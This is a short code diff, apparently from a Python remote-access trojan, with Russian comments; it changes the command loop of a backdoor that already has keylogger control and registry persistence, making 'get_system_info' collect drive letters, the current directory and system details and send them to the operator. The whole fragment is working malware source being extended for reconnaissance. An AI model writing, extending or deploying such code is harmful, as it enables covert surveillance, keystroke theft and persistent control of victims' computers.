@@ -2,6 +2,7 @@ import socket
 import json
 import subprocess
 import os
+import re # Чтобы диски определить
 
 import threading
 import keylogger
@@ -182,7 +183,9 @@ def shell():
             reliable_send('[+] Keylogger Stopped!')
         # Вызов: persistence Hacked program.exe
         elif command[:15] == 'get_system_info':
-            reliable_send(",".join(platform.uname()))
+            disks = ')('.join(re.findall(r"[A-Z]+:.*$", os.popen("mountvol /").read(), re.MULTILINE))
+            dirs = ','.join(platform.uname())
+            reliable_send('__Диски__: (' + disks + "),__Текущий каталог__:" + os.getcwd() + ",__Система__:," + dirs)
         elif command[:11] == 'persistence':
             reg_name, copy_name = command[12:].split(' ')
             persist(reg_name, copy_name)
